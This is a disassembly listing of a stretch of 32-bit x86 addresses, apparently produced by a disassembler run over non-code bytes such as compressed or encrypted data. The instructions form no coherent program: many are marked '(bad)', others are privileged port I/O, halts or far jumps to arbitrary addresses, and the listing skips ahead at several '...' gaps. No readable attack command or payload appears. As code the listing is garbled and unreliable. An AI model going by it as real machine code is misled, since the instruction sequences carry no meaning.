  41f3c9:	mov    esp,0x54161ad2
  41f3ce:	sbb    BYTE PTR [edx+0x7],dh
  41f3d1:	aaa    
  41f3d2:	das    
  41f3d3:	inc    ebp
  41f3d4:	inc    edi
  41f3d5:	(bad)  
  41f3d7:	sti    
  41f3d8:	xchg   DWORD PTR [ebp-0x24],ebp
  41f3db:	sub    cl,BYTE PTR [eax+ebp*4]
  41f3de:	or     BYTE PTR [edi-0x7fbb3e8c],dl
  41f3e4:	adc    eax,0xca50588a
  41f3e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3ea:	and    BYTE PTR [eax],bh
  41f3ec:	cld    
  41f3ed:	out    0xf7,eax
  41f3ef:	push   es
  41f3f0:	fcomi  st,st(3)
  41f3f2:	adc    ecx,esi
  41f3f4:	cs mov bl,0x3d
  41f3f7:	call   FWORD PTR [edi-0x41c2ca47]
  41f3fd:	ret    
  41f3fe:	pop    ebp
  41f3ff:	stc    
  41f400:	xchg   esi,eax
  41f401:	xor    dl,BYTE PTR [eax]
  41f403:	aas    
  41f404:	test   eax,0x1b156306
  41f409:	add    eax,0x44a3ac6
  41f40e:	sbb    BYTE PTR [ebp+0xa7],ch
	...
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x16
  41f481:	inc    edi
  41f482:	scas   eax,DWORD PTR es:[edi]
  41f483:	aam    0x39
  41f485:	dec    ebp
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    eax,0x8b000001
  41f48d:	retf   
  41f48e:	cmp    eax,DWORD PTR ds:0xa9678f3a
  41f494:	cmp    DWORD PTR [edi],ebp
  41f496:	ret    0x84d5
  41f499:	mov    edx,0xd611a1ec
  41f49e:	js     0x41f4f9
  41f4a0:	add    BYTE PTR [eax-0x6e],dh
  41f4a3:	add    al,0xbb
  41f4a5:	adc    BYTE PTR ds:0xcfc2e618,dl
  41f4ab:	xchg   ecx,eax
  41f4ac:	aam    0x81
  41f4ae:	das    
  41f4af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4b0:	out    0x2a,al
  41f4b2:	cmp    DWORD PTR [edx-0x71],ebp
  41f4b5:	pop    ebx
  41f4b6:	cs dec ebp
  41f4b8:	xchg   edi,eax
  41f4b9:	inc    edx
  41f4ba:	add    BYTE PTR ds:0x76922d65,cl
  41f4c0:	ret    
  41f4c1:	sbb    eax,0xceff0e88
  41f4c6:	cli    
  41f4c7:	div    bl
  41f4c9:	call   0xf8ad:0x37d73716
  41f4d0:	xor    ebp,DWORD PTR [edx+0x639d391d]
  41f4d6:	xor    esi,DWORD PTR [esi-0x14]
  41f4d9:	mov    ah,0x3f
  41f4db:	cmp    al,0x6b
  41f4dd:	mov    ebp,0x4bcb95a9
  41f4e2:	push   edx
  41f4e3:	sbb    ebp,DWORD PTR [ebx-0x70]
  41f4e6:	(bad)  
  41f4e7:	stos   DWORD PTR es:[edi],eax
  41f4e8:	shl    BYTE PTR [edx+0x46f328a9],cl
  41f4ee:	mov    eax,ds:0x6567a7ac
  41f4f3:	cdq    
  41f4f4:	jnp    0x41f4d7
  41f4f6:	sbb    BYTE PTR [edx],0x47
  41f4f9:	jp     0x41f47f
  41f4fb:	add    ebp,edx
  41f4fd:	(bad)  
  41f4fe:	jno    0x41f4d5
  41f500:	xchg   ebx,ebx
  41f502:	xchg   ecx,edi
  41f504:	xchg   DWORD PTR [esp+eax*4-0x70],ebx
  41f508:	pop    edx
  41f509:	repz jp 0x41f584
  41f50c:	push   0xffffffa1
  41f50e:	repz add eax,0x28266c2e
  41f514:	daa    
  41f515:	dec    ebx
  41f516:	adc    eax,0x7f02bbf4
  41f51b:	add    DWORD PTR [esi+ebp*4],edi
  41f51e:	cmp    dl,BYTE PTR [edx-0x34]
  41f521:	dec    ecx
  41f522:	fidivr WORD PTR [ebx]
  41f524:	mov    ecx,0x44594ab
  41f529:	xchg   edx,eax
  41f52a:	push   ebx
  41f52b:	xchg   ecx,eax
  41f52c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f52d:	jns    0x41f5a1
  41f52f:	mov    ds:0xb24f9ecd,al
  41f534:	adc    ch,BYTE PTR [ecx+0x6df439e6]
  41f53a:	imul   BYTE PTR [ebp+0x4d]
  41f53d:	add    al,0xb
  41f53f:	je     0x41f5ac
  41f541:	mov    ebp,DWORD PTR [edx-0x1d]
  41f544:	loop   0x41f59c
  41f546:	inc    edi
  41f547:	js     0x41f593
  41f549:	int    0xae
  41f54b:	adc    al,0xdc
  41f54d:	int    0x10
  41f54f:	xchg   ebx,eax
  41f550:	sbb    ch,BYTE PTR [ecx+0x13]
  41f553:	mov    eax,ds:0x1932ce20
  41f558:	add    esi,DWORD PTR [ecx-0x70]
  41f55b:	(bad)  
  41f55c:	pop    edi
  41f55d:	(bad)  
  41f55e:	jmp    0x11442c81
  41f563:	lahf   
  41f564:	(bad)  
  41f565:	jmp    0xb0f105ba
  41f56a:	cmc    
  41f56b:	mov    ds:0x7d53d654,al
  41f570:	aaa    
  41f571:	xor    cl,dh
  41f573:	je     0x41f558
  41f575:	mov    ah,0xc6
  41f577:	out    dx,al
  41f578:	inc    esi
  41f579:	xor    eax,0x2ea078a4
  41f57e:	cmc    
  41f57f:	adc    esi,DWORD PTR [esp+eiz*2-0x420dfe2a]
  41f586:	sbb    dl,BYTE PTR [eax]
  41f588:	jne    0x41f5a6
  41f58a:	jo     0x41f577
  41f58c:	mov    al,ds:0xad014a08
	...
  41f5f1:	add    BYTE PTR [eax],al
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0xb6a6:0x4468d422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0xce000001
  41f60d:	cmp    eax,DWORD PTR [edx-0x77bcb33d]
  41f613:	push   ds
  41f614:	xchg   esp,eax
  41f615:	or     BYTE PTR [esi],0x41
  41f618:	and    esp,DWORD PTR [edx+0x34]
  41f61b:	lods   eax,DWORD PTR ds:[esi]
  41f61c:	adc    al,dl
  41f61e:	pop    esp
  41f61f:	hlt    
  41f620:	pop    ds
  41f621:	mov    esi,0xb1d244f5
  41f626:	ja     0x41f5d9
  41f628:	adc    BYTE PTR [ebx],ah
  41f62a:	mov    BYTE PTR [esi-0x56],cl
  41f62d:	lods   eax,DWORD PTR ds:[esi]
  41f62e:	mov    cl,0xd9
  41f630:	jo     0x41f681
  41f632:	cmp    DWORD PTR [eax+0x79],ebx
  41f635:	lea    eax,ds:0x66401416
  41f63b:	add    eax,0xdd410c9f
  41f640:	inc    ebx
  41f641:	(bad)  
  41f642:	in     eax,dx
  41f643:	aam    0xfd
  41f645:	cmp    bl,BYTE PTR [edx]
  41f647:	bound  esi,QWORD PTR [esi-0x1]
  41f64a:	in     al,0xc1
  41f64c:	cmp    ah,BYTE PTR [ecx]
  41f64e:	mov    ecx,0x4791f340
  41f653:	enter  0x5d99,0x93
  41f657:	push   ds
  41f658:	ficom  DWORD PTR [esp+edi*4-0x49]
  41f65c:	movaps xmm3,XMMWORD PTR [ebp+0x716b1d3f]
  41f663:	mov    WORD PTR [esi+0x14cedb54],cs
  41f669:	mov    eax,0x8d11262a
  41f66e:	cdq    
  41f66f:	fs rcl ebx,cl
  41f672:	mov    ch,0x4e
  41f674:	dec    ebp
  41f675:	ret    0x6586
  41f678:	or     edi,esi
  41f67a:	pusha  
  41f67b:	repnz or eax,0x32982783
  41f681:	jb     0x41f6d4
  41f683:	mov    ebp,0x176a08ce
  41f688:	int3   
  41f689:	and    edx,eax
  41f68b:	(bad)  
  41f68c:	and    eax,0xf47acd8b
  41f691:	psllq  mm0,QWORD PTR [edi]
  41f694:	lahf   
  41f695:	lods   al,BYTE PTR ds:[esi]
  41f696:	xchg   esp,eax
  41f697:	ins    DWORD PTR es:[edi],dx
  41f698:	mov    ch,0x90
  41f69a:	cmp    dl,ch
  41f69c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f69d:	es ds dec edi
  41f6a0:	mov    ebp,0x53f6bc95
  41f6a5:	inc    esi
  41f6a6:	add    ch,BYTE PTR [ebp-0x71e448b0]
  41f6ac:	arpl   WORD PTR [ecx+0x27],si
  41f6af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6b0:	dec    esp
  41f6b1:	lods   al,BYTE PTR ds:[esi]
  41f6b2:	pop    ebx
  41f6b3:	ror    DWORD PTR [ebx],0x2
  41f6b6:	or     BYTE PTR [ebp-0x30],al
  41f6b9:	sti    
  41f6ba:	pushf  
  41f6bb:	repnz cmp eax,0x86ce750d
  41f6c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6c2:	jg     0x41f654
  41f6c4:	sub    DWORD PTR [ecx-0x44],esp
  41f6c7:	ficom  WORD PTR [esi]
  41f6c9:	pop    esp
  41f6ca:	pop    es
  41f6cb:	rcl    BYTE PTR [edi],cl
  41f6cd:	add    BYTE PTR [eax-0x5e3b5ca3],ah
  41f6d3:	xor    eax,0x6e61a673
  41f6d8:	stc    
  41f6d9:	inc    ebp
  41f6da:	mov    ecx,DWORD PTR [ebx+0x23fd139d]
  41f6e0:	jp     0x41f6a5
  41f6e2:	xlat   BYTE PTR ds:[ebx]
  41f6e3:	sub    DWORD PTR [esi+0x33b2fc0a],ecx
  41f6e9:	lods   eax,DWORD PTR ds:[si]
  41f6eb:	pop    esp
  41f6ec:	fldcw  WORD PTR [esi+0x2bfd249b]
  41f6f2:	ret    
  41f6f3:	addr16 je 0x41f6c2
  41f6f6:	ret    
  41f6f7:	sti    
  41f6f8:	adc    ebx,DWORD PTR [eax]
  41f6fa:	mov    dl,0x1c
  41f6fc:	push   ebp
  41f6fd:	test   BYTE PTR [edx-0x13],cl
  41f700:	sbb    bh,BYTE PTR [ecx+0x4f]
  41f703:	sub    al,0x1c
  41f705:	dec    BYTE PTR [ecx-0x69]
  41f708:	in     al,dx
  41f709:	adc    eax,0x1c94d397
  41f70e:	mov    ecx,0x8fa0
	...
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x38f6:0x816c62d2
  41f783:	fld    DWORD PTR [ebx+0x4f]
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0xa9000001
  41f78d:	push   ebx
  41f78e:	hlt    
  41f78f:	push   0x3a
  41f791:	addr16 push 0x2f703b19
  41f797:	fild   DWORD PTR [ebx-0x273c8679]
  41f79d:	pop    esi
  41f79e:	retf   0xbd29
  41f7a1:	stos   DWORD PTR es:[edi],eax
  41f7a2:	rol    edi,cl
  41f7a4:	rcr    DWORD PTR [eax],cl
  41f7a6:	mov    BYTE PTR ds:0x2c1ff878,dl
  41f7ac:	cs in  al,dx
  41f7ae:	push   ebx
  41f7af:	out    0x4f,eax
  41f7b1:	inc    edx
  41f7b2:	cwde   
  41f7b3:	pop    esi
  41f7b4:	rcl    BYTE PTR [ebx+0x2fdc3e2],0x7d
  41f7bb:	stc    
  41f7bc:	inc    eax
  41f7bd:	inc    eax
  41f7be:	add    al,0xfa
  41f7c0:	fcomp  QWORD PTR [edi-0x28007503]
  41f7c6:	popa   
  41f7c7:	mov    esi,0x38e23156
  41f7cc:	mov    BYTE PTR [ebx-0x3c46a40b],bh
  41f7d2:	rol    DWORD PTR [esi+edi*8],cl
  41f7d5:	icebp  
  41f7d6:	in     al,0xe1
  41f7d8:	js     0x41f7cb
  41f7da:	and    al,al
  41f7dc:	adc    al,0x34
  41f7de:	enter  0xaeee,0xc1
  41f7e2:	jge    0x41f7ed
  41f7e4:	test   eax,0x4ce2bce6
  41f7e9:	hlt    
  41f7ea:	adc    esp,0x81b0489a
  41f7f0:	and    eax,0x15fcbda
  41f7f5:	dec    esi
  41f7f6:	outs   dx,DWORD PTR ds:[esi]
  41f7f7:	mov    ds:0xe6b35a8b,eax
  41f7fc:	stc    
  41f7fd:	add    ebx,DWORD PTR [esi+edi*1]
  41f800:	and    bl,BYTE PTR [esp+edx*2]
  41f803:	stc    
  41f804:	xchg   esi,eax
  41f805:	pop    edx
  41f806:	pushf  
  41f807:	(bad)  
  41f808:	adc    al,BYTE PTR [ecx+0x4e]
  41f80b:	mov    ebp,DWORD PTR [ebp-0x12]
  41f80e:	sbb    eax,0x8dd7fffb
  41f813:	sbb    al,0x17
  41f815:	popf   
  41f816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f817:	push   edx
  41f818:	imul   edx,esi,0x36
  41f81b:	nop
  41f81c:	cmp    al,0xce
  41f81e:	push   ds
  41f81f:	in     eax,0xf6
  41f821:	mov    DWORD PTR [edi+0x3a3044d4],edi
  41f827:	(bad)
  41f82a:	push   esp
  41f82b:	lock cld 
  41f82d:	leave  
  41f82e:	mov    ebx,0xbdae0f7c
  41f833:	in     al,0x92
  41f835:	iret   
  41f836:	in     al,dx
  41f837:	mov    ch,0x14
  41f839:	sbb    cl,BYTE PTR [ecx+0x68]
  41f83c:	cs push esi
  41f83e:	dec    ebx
  41f83f:	jns    0x41f8ae
  41f841:	inc    ebx
  41f842:	popa   
  41f843:	cli    
  41f844:	jnp    0x41f8bf
  41f846:	inc    esp
  41f847:	or     ebp,DWORD PTR [ecx-0x1c118759]
  41f84d:	mov    ch,0x84
  41f84f:	mov    ebx,DWORD PTR [edx-0x302b21cb]
  41f855:	cmp    eax,0x1f01b02
  41f85a:	xchg   edi,eax
  41f85b:	or     edx,0x8a1055e0
  41f861:	jp     0x41f8ce
  41f863:	(bad)  
  41f864:	ret    0xa3d3
  41f867:	shr    DWORD PTR [ecx-0x3],cl
  41f86a:	dec    esi
  41f86b:	or     DWORD PTR [edi+eax*2-0x5606cd9b],eax
  41f872:	push   esi
  41f873:	(bad)  
  41f874:	inc    esi
  41f875:	fistp  DWORD PTR [edx]
  41f877:	pop    es
  41f878:	gs (bad) 
  41f87a:	retf   0xbcb9
  41f87d:	adc    al,BYTE PTR [ecx-0x67ad9502]
  41f883:	xor    esp,edi
  41f885:	aad    0x5c
  41f887:	aas    
  41f888:	mov    ?,WORD PTR [esi-0x11]
  41f88b:	mov    ecx,edi
  41f88d:	into   
  41f88e:	sbb    DWORD PTR [esi-0x57],ebp
	...
  41f8f1:	add    BYTE PTR [eax],al
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	and    DWORD PTR [edi-0x2b],0x19
  41f904:	dec    eax
  41f905:	push   eax
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0xc000001
  41f90d:	ret    0x6a75
  41f910:	loopne 0x41f8af
  41f912:	mov    ds:0xbb259b72,eax
  41f917:	xchg   DWORD PTR [ebp+0x5e],edi
  41f91a:	sbb    eax,esp
  41f91c:	add    edx,DWORD PTR [edx+eiz*2+0x2512d6d6]
  41f923:	dec    ecx
  41f924:	lods   eax,DWORD PTR ds:[esi]
  41f925:	outs   dx,BYTE PTR ds:[esi]
  41f926:	pop    esp
  41f927:	sub    ah,BYTE PTR [edi]
  41f929:	sub    BYTE PTR [esi+0x79349639],bl
  41f92f:	cmp    edx,DWORD PTR [ebx+0x3b5f5bf4]
  41f935:	sbb    eax,0xe2b4afcf
  41f93a:	jnp    0x41f936
  41f93c:	or     al,0x4c
  41f93e:	xlat   BYTE PTR ds:[ebx]
  41f93f:	jb     0x41f8ce
  41f941:	fisubr DWORD PTR [edi-0x5b]
  41f944:	call   0xd86f7d1c
  41f949:	sub    ebp,edi
  41f94b:	loope  0x41f8e0
  41f94d:	or     al,0x89
  41f94f:	ror    DWORD PTR [esi+0x59],0x41
  41f953:	je     0x41f9c3
  41f955:	nop
  41f956:	mov    WORD PTR [edx+0x3be4c030],ss
  41f95c:	(bad)  
  41f95d:	fisttp DWORD PTR [ebp-0x7c2b8139]
  41f963:	repz pop ecx
  41f965:	mov    bl,0x15
  41f967:	mov    eax,ds:0xa752b68e
  41f96c:	fstp   st(1)
  41f96e:	je     0x41f9a5
  41f970:	dec    edi
  41f971:	cmp    edi,eax
  41f973:	sti    
  41f974:	or     cl,bh
  41f976:	jle    0x41f9a2
  41f978:	fadd   st(3),st
  41f97a:	retf   
  41f97b:	imul   esp,esp,0x482fbcde
  41f981:	cwde   
  41f982:	pop    ecx
  41f983:	mov    ebp,0xd4050a9e
  41f988:	and    ecx,edi
  41f98a:	dec    ebx
  41f98b:	xor    al,0xb3
  41f98d:	jbe    0x41f980
  41f98f:	jmp    0x83f43646
  41f994:	je     0x41f9f8
  41f996:	sub    DWORD PTR [edi-0x57],esi
  41f999:	adc    eax,0xd3c3f687
  41f99e:	inc    BYTE PTR [edi-0x2ce8bad6]
  41f9a4:	(bad)  
  41f9a5:	shl    BYTE PTR [edi-0x1b],0x61
  41f9a9:	or     BYTE PTR ds:0x698ce2e3,ah
  41f9af:	adc    dh,BYTE PTR [ecx]
  41f9b1:	xor    ebp,DWORD PTR [eax+edx*8+0x36]
  41f9b5:	mov    ch,0x4b
  41f9b7:	cli    
  41f9b8:	xor    eax,0x635e148e
  41f9bd:	mov    ds:0x828b3506,eax
  41f9c2:	into   
  41f9c3:	sbb    DWORD PTR [edi],0xffffffa7
  41f9c6:	aaa    
  41f9c7:	adc    eax,0x85c63f38
  41f9cc:	mov    ah,0xf2
  41f9ce:	xor    DWORD PTR [esi-0x53],edx
  41f9d1:	ins    DWORD PTR es:[edi],dx
  41f9d2:	mov    al,ds:0xfc7af082
  41f9d7:	call   0x5a79280f
  41f9dc:	sub    al,0xff
  41f9de:	push   ebp
  41f9df:	es xor eax,0x9cf4e691
  41f9e5:	mov    eax,ds:0xcc98043
  41f9ea:	mov    ecx,0xd4533477
  41f9ef:	push   ds
  41f9f0:	sbb    bl,BYTE PTR [edx-0x2e]
  41f9f3:	aas    
  41f9f4:	xor    ebx,DWORD PTR [ebx*2-0x4fcfd46e]
  41f9fb:	dec    esi
  41f9fc:	add    bl,BYTE PTR [eax-0x34]
  41f9ff:	mov    ecx,0xdea04024
  41fa04:	mov    esp,0x3cd819fa
  41fa09:	adc    DWORD PTR [esi-0x30],0xedd97cac
  41fa10:	add    al,0x0
	...
  41fa72:	add    BYTE PTR [eax],al
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0xedaab313
  41fa84:	dec    ebp
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0x62000001
  41fa8d:	stos   BYTE PTR es:[edi],al
  41fa8e:	or     BYTE PTR [ecx],bl
  41fa90:	xor    BYTE PTR [esi-0x7c],bl
  41fa93:	mov    al,0xe0
  41fa95:	sbb    BYTE PTR [edi+ebx*1-0x4a],cl
  41fa99:	push   ebp
  41fa9a:	adc    BYTE PTR [esi],dh
  41fa9c:	loop   0x41fa4b
  41fa9e:	mov    eax,0xb4d5d7c6
  41faa3:	imul   ebx,DWORD PTR [eax+0x2b],0xa8e7ef3c
  41faaa:	aaa    
  41faab:	fsubr  DWORD PTR [ebp-0x34]
  41faae:	jmp    0x7b53:0xe431e413
  41fab5:	jecxz  0x41fac1
  41fab7:	adc    al,0x69
  41fab9:	in     eax,0xbb
  41fabb:	stos   BYTE PTR es:[edi],al
  41fabc:	push   edi
  41fabd:	(bad)  
  41fabe:	sub    BYTE PTR [eax+0x3e],ch
  41fac1:	imul   ecx,DWORD PTR [edi-0x139b80d1],0x59
  41fac8:	mov    al,ds:0x88436eab
  41facd:	add    BYTE PTR [eax],cl
  41facf:	sbb    cl,BYTE PTR [eax-0x757473ff]
  41fad5:	xchg   edx,eax
  41fad6:	push   ebx
  41fad7:	and    eax,0xe5ba526e
  41fadc:	and    al,0x9
  41fade:	shl    BYTE PTR [ecx],1
  41fae0:	std    
  41fae1:	pop    ecx
  41fae2:	cmp    al,0x1e
  41fae4:	xor    ah,0x53
  41fae7:	ins    BYTE PTR es:[edi],dx
  41fae8:	lods   al,BYTE PTR ds:[esi]
  41fae9:	add    bh,BYTE PTR [edx]
  41faeb:	pushf  
  41faec:	cwde   
  41faed:	jmp    0x95b7a929
  41faf2:	add    DWORD PTR ds:0x6b45e7b0,edi
  41faf8:	sbb    esi,ecx
  41fafa:	arpl   WORD PTR [esi],bx
  41fafc:	nop
  41fafd:	cs lahf 
  41faff:	jmp    0x41faab
  41fb01:	stos   DWORD PTR es:[di],eax
  41fb03:	pop    edi
  41fb04:	les    eax,FWORD PTR [eax+0x4fed06b9]
  41fb0a:	out    dx,al
  41fb0b:	leave  
  41fb0c:	sbb    cl,BYTE PTR [edx*4-0x34e6d8e3]
  41fb13:	stc    
  41fb14:	int    0xac
  41fb16:	mov    WORD PTR [edx+0x4eed4406],ss
  41fb1c:	gs or  edi,edi
  41fb1f:	xchg   edi,eax
  41fb20:	arpl   WORD PTR [eax],di
  41fb22:	dec    ebp
  41fb23:	push   0xffffffd5
  41fb25:	loope  0x41fb1d
  41fb27:	push   es
  41fb28:	pop    ecx
  41fb29:	ds sbb al,0xbb
  41fb2c:	fwait
  41fb2d:	hlt    
  41fb2e:	fcmove st,st(0)
  41fb30:	inc    ebx
  41fb31:	adc    DWORD PTR [ebx-0xc],0xffffff9d
  41fb35:	sbb    al,0xae
  41fb37:	sub    dh,dh
  41fb39:	push   esp
  41fb3a:	dec    edx
  41fb3b:	cli    
  41fb3c:	pop    ecx
  41fb3d:	fsub   DWORD PTR [edi]
  41fb3f:	sub    al,0x37
  41fb41:	mov    esi,0x6a7967aa
  41fb46:	mov    ebx,0xe5eef885
  41fb4b:	or     ebp,DWORD PTR gs:[ecx-0x53]
  41fb4f:	cmc    
  41fb50:	and    eax,0xf6ee48d7
  41fb55:	dec    eax
  41fb56:	cmc    
  41fb57:	lds    edx,FWORD PTR [edx+0xfaefdce]
  41fb5d:	jle    0x41fba4
  41fb5f:	test   eax,0x82c4c77e
  41fb64:	cmp    dl,ah
  41fb66:	or     dh,BYTE PTR [edi-0x63]
  41fb69:	in     eax,dx
  41fb6a:	pushf  
  41fb6b:	mov    DWORD PTR [esi+0xd],esi
  41fb6e:	jl     0x41fbc7
  41fb70:	cwde   
  41fb71:	mov    ebp,0x5cb6d332
  41fb76:	sti    
  41fb77:	not    BYTE PTR [ebp-0x4239bf6c]
  41fb7d:	in     eax,0x1f
  41fb7f:	jbe    0x41fb61
  41fb81:	in     al,dx
  41fb82:	lea    ecx,[ebx+ecx*4-0x35c78139]
  41fb89:	aam    0x90
  41fb8b:	xchg   ebx,eax
  41fb8c:	mov    al,0x6a
  41fb8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb8f:	sahf   
  41fb90:	stos   DWORD PTR es:[edi],eax
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	push   ss
  41fc01:	(bad)  
  41fc02:	mov    ebp,0x152526c
  41fc07:	add    BYTE PTR ds:0x50000001,al
  41fc0d:	sbb    DWORD PTR [edi],ebx
  41fc0f:	xchg   BYTE PTR [esi+0x5b1144ed],dl
  41fc15:	jae    0x41fc37
  41fc17:	push   es
  41fc18:	xchg   edx,eax
  41fc19:	call   0xca932db1
  41fc1e:	xor    DWORD PTR [ecx+0x486526a3],ecx
  41fc24:	popf   
  41fc25:	in     eax,0x9f
  41fc27:	mov    bl,0x19
  41fc29:	pop    esp
  41fc2a:	sbb    eax,0x8a5efe2
  41fc2f:	xchg   di,ax
  41fc31:	ret    
  41fc32:	hlt    
  41fc33:	fstp   DWORD PTR fs:[esi+0x5a]
  41fc37:	jb     0x41fc3c
  41fc39:	mov    al,0xe7
  41fc3b:	repz dec esi
  41fc3d:	out    0x8d,al
  41fc3f:	ret    0x5841
  41fc42:	cld    
  41fc43:	dec    edx
  41fc44:	lahf   
  41fc45:	popa   
  41fc46:	mov    ebp,ecx
  41fc48:	loope  0x41fc96
  41fc4a:	mov    BYTE PTR [ebp+0x64],cl
  41fc4d:	pop    ebp
  41fc4e:	not    BYTE PTR [ebp-0x8]
  41fc51:	adc    bl,bl
  41fc53:	mov    al,0xce
  41fc55:	pop    ecx
  41fc56:	xor    ecx,esi
  41fc58:	pop    ds
  41fc59:	xor    ah,BYTE PTR [esi+ebp*8]
  41fc5c:	scas   eax,DWORD PTR es:[edi]
  41fc5d:	cli    
  41fc5e:	dec    esp
  41fc5f:	stos   DWORD PTR es:[edi],eax
  41fc60:	or     bl,BYTE PTR [ebp-0x56]
  41fc63:	xchg   esi,eax
  41fc64:	mov    ch,BYTE PTR [edx+ebp*8]
  41fc67:	es jns 0x41fcc8
  41fc6a:	and    eax,0xcaacde45
  41fc6f:	sar    eax,1
  41fc71:	stos   DWORD PTR es:[edi],eax
  41fc72:	mov    bh,0xb
  41fc74:	bound  esp,QWORD PTR ds:0xcf4ea0e3
  41fc7a:	inc    edx
  41fc7b:	cmp    cl,BYTE PTR [edx-0x58a7e400]
  41fc81:	neg    BYTE PTR [ebx]
  41fc83:	out    0xbe,al
  41fc85:	sub    eax,0x5618eb34
  41fc8a:	jge    0x41fca3
  41fc8c:	addr16 sub al,0x13
  41fc8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc90:	push   ebp
  41fc91:	mov    esi,0xe7976d71
  41fc96:	xchg   ebp,eax
  41fc97:	leave  
  41fc98:	sbb    al,0x62
  41fc9a:	hlt    
  41fc9b:	xchg   BYTE PTR [edx+ebx*2],dl
  41fc9e:	scas   eax,DWORD PTR es:[edi]
  41fc9f:	dec    esi
  41fca0:	xchg   BYTE PTR [esi+ecx*1+0x7e],al
  41fca4:	xchg   BYTE PTR [ebp+0x3bb0c033],ch
  41fcaa:	jae    0x41fcbe
  41fcac:	dec    ecx
  41fcad:	jp     0x41fc63
  41fcaf:	repz shl BYTE PTR [edi],cl
  41fcb2:	enter  0x4ac,0xf9
  41fcb6:	loop   0x41fcfb
  41fcb8:	xor    esi,DWORD PTR [eax-0x5fc4f8de]
  41fcbe:	(bad)  
  41fcbf:	and    BYTE PTR [bx-0x2697],ah
  41fcc4:	sub    BYTE PTR ds:0xbff5b4e4,bh
  41fcca:	cmp    al,BYTE PTR [ebx-0x76]
  41fccd:	mov    eax,DWORD PTR [edi-0x76]
  41fcd0:	inc    ebx
  41fcd1:	mov    ebp,0x15bc46fd
  41fcd6:	stos   DWORD PTR es:[edi],eax
  41fcd7:	fild   WORD PTR ss:[ebx+0x76]
  41fcdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcdc:	jmp    0x41fd49
  41fcde:	into   
  41fcdf:	ret    
  41fce0:	test   edi,ebp
  41fce2:	xor    ah,BYTE PTR [ebp-0x3d]
  41fce5:	popa   
  41fce6:	stos   DWORD PTR es:[edi],eax
  41fce7:	sub    eax,0xdb993d3a
  41fcec:	mov    dl,0xa
  41fcee:	sub    DWORD PTR [ebp-0x74],esi
  41fcf1:	inc    ebx
  41fcf2:	pop    es
  41fcf3:	scas   al,BYTE PTR es:[edi]
  41fcf4:	dec    eax
  41fcf5:	mov    dh,0x51
  41fcf7:	sti    
  41fcf8:	or     eax,0x977a525f
  41fcfd:	fld    TBYTE PTR [ebp-0x52ea4188]
  41fd03:	cdq    
  41fd04:	loop   0x41fd27
  41fd06:	pop    es
  41fd07:	and    DWORD PTR [ebx],ebx
  41fd09:	mov    ecx,0x7e61bca0
  41fd0e:	and    DWORD PTR [edi+0x9a],eax
	...
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	hlt    
  41fd81:	xor    BYTE PTR [ecx-0x16],bh
  41fd84:	push   edi
  41fd85:	push   ebx
  41fd86:	add    DWORD PTR [eax],eax
  41fd88:	add    eax,0xaa000001
  41fd8d:	or     cl,ah
  41fd8f:	arpl   WORD PTR [edi+0x59],bx
  41fd92:	jae    0x41fdae
  41fd94:	pop    ebx
  41fd95:	cmp    al,0x2f
  41fd98:	xor    bh,dh
  41fd9a:	popa   
  41fd9b:	fsub   QWORD PTR [ebp+0x2dd54f0c]
  41fda1:	push   cs
  41fda2:	push   cs
  41fda3:	mov    ah,0xab
  41fda5:	mov    dh,0x82
  41fda7:	cs stos BYTE PTR es:[edi],al
  41fda9:	and    eax,0x1f867b5d
  41fdae:	push   edi
  41fdaf:	enter  0xb4d3,0xa0
  41fdb3:	fidiv  WORD PTR [ebp-0x1a]
  41fdb6:	jle    0x41fd6a
  41fdb8:	mov    ecx,0xa05f93c8
  41fdbd:	aam    0x85
  41fdbf:	push   0xe601fb15
  41fdc4:	idiv   BYTE PTR [edx-0x6e]
  41fdc7:	cdq    
  41fdc8:	lods   eax,DWORD PTR ds:[esi]
  41fdc9:	jle    0x41fd82
  41fdcb:	jge    0x41fd90
  41fdcd:	lds    ebp,FWORD PTR [ecx]
  41fdcf:	xchg   esp,eax
  41fdd0:	ret    
  41fdd1:	lds    esp,FWORD PTR [edx-0x1ef568f0]
  41fdd7:	xor    edi,DWORD PTR [edi-0x53]
  41fdda:	pop    edx
